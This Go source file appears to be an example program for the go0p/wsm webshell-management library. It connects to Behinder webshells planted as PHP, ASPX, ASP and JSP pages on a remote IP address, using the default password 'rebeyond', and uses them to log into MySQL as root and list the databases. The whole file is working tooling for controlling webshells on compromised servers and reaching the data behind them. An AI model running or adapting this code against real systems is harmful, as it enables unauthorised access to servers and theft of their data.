package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"log"
)

func main() {
	log.SetFlags(log.Lshortfile)
	jspDatabaseOpt()
	aspDatabaseOpt()
	aspxDatabaseOpt()
	phpDatabaseOpt()
}

func phpDatabaseOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86/bx.php",
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	db := &behinder.DBManagerParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Type:           "mysql",
		Host:           "127.0.0.1",
		Port:           3306,
		User:           "root",
		Pass:           "root",
		Database:       "godzilla",
		Sql:            "SHOW DATABASES",
	}
	dbres, err := bx.DatabaseManagement(db)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(dbres.ToMap())
}

func aspxDatabaseOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.aspx",
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	db := &behinder.DBManagerParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Type:           "mysql",
		Host:           "127.0.0.1",
		Port:           3306,
		User:           "root",
		Pass:           "root",
		Database:       "godzilla",
		Sql:            "SHOW DATABASES",
	}
	dbres, err := bx.DatabaseManagement(db)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(dbres.ToMap())
}

func aspDatabaseOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.asp",
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	db := &behinder.DBManagerParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Type:           "mysql",
		Host:           "127.0.0.1",
		Port:           3306,
		User:           "root",
		Pass:           "root",
		Database:       "godzilla",
		Sql:            "SHOW DATABASES",
	}
	dbres, err := bx.DatabaseManagement(db)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(dbres.ToMap())
}

func jspDatabaseOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	db := &behinder.DBManagerParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Type:           "mysql",
		Host:           "127.0.0.1",
		Port:           3306,
		User:           "root",
		Pass:           "root",
		Database:       "godzilla",
		Sql:            "SHOW DATABASES",
	}
	dbres, err := bx.DatabaseManagement(db)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(dbres.ToMap())
}
